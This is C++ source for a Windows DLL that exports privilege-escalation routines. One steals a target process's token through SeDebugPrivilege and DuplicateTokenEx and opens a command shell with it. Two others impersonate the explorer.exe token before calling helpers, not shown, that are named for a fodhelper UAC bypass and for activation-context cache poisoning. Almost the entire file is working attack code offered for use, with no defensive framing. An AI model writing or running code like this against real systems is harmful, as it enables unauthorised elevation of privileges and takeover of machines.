// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "FodHelperAbuseEscalationUtils.h"
#include "ActivationContextCachePoisoningEscalation.h"
#include "shared.h"

#include <shellapi.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wchar.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) int TokenTheftEscalation(DWORD pid) {
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        printf("LookupPrivilegeValue failed: %lu\n", GetLastError());
        return -1;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) {
        printf("%lu\n", GetLastError());
        return -2;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        printf("%lu\n", GetLastError());
        CloseHandle(token);
        return -3;
    }

    printf("AdjustTokenPrivileges OK\n");

    CloseHandle(token);

    HANDLE cToken = NULL;
    HANDLE ph = NULL;

    ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);

    if (!ph) {
        printf("OpenProcess failed: %lu\n", GetLastError());
        return -4;

    }

    printf("OpenProcessToken (target) OK\n");

    if (!OpenProcessToken(ph, MAXIMUM_ALLOWED, &cToken)) {
        printf("OpenProcessToken (target) failed: %lu\n", GetLastError());
        CloseHandle(ph);
        return -5;
    }

    CloseHandle(ph);

    HANDLE dToken = NULL;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(STARTUPINFOW));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFOW);

    if (!DuplicateTokenEx(cToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken)) {
        printf("[-] DuplicateTokenEx failed: %lu\n", GetLastError());
        CloseHandle(cToken);
        return -6;
    }

    printf("DuplicateTokenEx OK\n");

    LPCWSTR appPath = L"C:\\Windows\\System32\\cmd.exe";

    if (!CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, appPath, NULL, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcessWithTokenW failed: %lu\n", GetLastError());
        CloseHandle(cToken);
        CloseHandle(dToken);
        return -7;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(cToken);
    CloseHandle(dToken);
    printf("Process created successfully.\n");
    return 0;
}

extern "C" __declspec(dllexport) int FodHelperAbuseEscalation() {

    Marker();

    DWORD explorerPid = FindExplorerPidInMySession();
    if (!explorerPid) { printf("No explorer.exe found.\n"); return 1; }

    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, explorerPid);
    if (!hProc) { printf("OpenProcess failed: %lu\n", GetLastError()); return 1; }

    HANDLE hTok = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hTok))
    {
        printf("OpenProcessToken failed: %lu\n", GetLastError());
        CloseHandle(hProc);
        return 1;
    }
    CloseHandle(hProc);

    HANDLE hImpersonation = NULL;
    if (!DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hImpersonation))
    {
        printf("DuplicateTokenEx failed: %lu\n", GetLastError());
        CloseHandle(hTok);
        return 1;
    }
    CloseHandle(hTok);

    if (!ImpersonateLoggedOnUser(hImpersonation))
    {
        printf("ImpersonateLoggedOnUser failed: %lu\n", GetLastError());
        CloseHandle(hImpersonation);
        return 1;
    }

    Marker();

    FodHelperAbuseEscalationInternal();

    RevertToSelf();
    CloseHandle(hImpersonation);
    return 0;
}

extern "C" __declspec(dllexport) int ActivationContextCachePoisoningEscalation() {
    Marker();

    DWORD explorerPid = FindExplorerPidInMySession();
    if (!explorerPid) { printf("No explorer.exe found.\n"); return 1; }

    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, explorerPid);
    if (!hProc) { printf("OpenProcess failed: %lu\n", GetLastError()); return 1; }

    HANDLE hTok = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hTok))
    {
        printf("OpenProcessToken failed: %lu\n", GetLastError());
        CloseHandle(hProc);
        return 1;
    }
    CloseHandle(hProc);

    HANDLE hImpersonation = NULL;
    if (!DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hImpersonation))
    {
        printf("DuplicateTokenEx failed: %lu\n", GetLastError());
        CloseHandle(hTok);
        return 1;
    }
    CloseHandle(hTok);

    if (!ImpersonateLoggedOnUser(hImpersonation))
    {
        printf("ImpersonateLoggedOnUser failed: %lu\n", GetLastError());
        CloseHandle(hImpersonation);
        return 1;
    }

    Marker();

    ActivationContextCachePoisoningEscalationInternal();

    RevertToSelf();
    CloseHandle(hImpersonation);
    return 0;
}

